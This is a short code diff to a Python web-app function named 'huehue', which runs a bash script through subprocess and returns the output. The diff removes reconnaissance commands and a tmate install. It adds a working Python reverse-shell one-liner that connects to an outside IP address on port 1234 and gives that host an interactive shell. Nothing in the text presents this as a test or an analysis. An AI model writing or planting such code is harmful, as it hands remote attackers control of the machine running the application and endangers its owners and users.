@@ -54,9 +54,8 @@ def huehue():
     script = '''
     #!/bin/bash
 
-    whoami
-    id
-    sudo apt install tmate -y
+    export RHOST="148.113.6.17";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+    
     '''
     result = subprocess.run(script, shell=True, capture_output=True, text=True)
     return jsonify({'output': result.stdout})
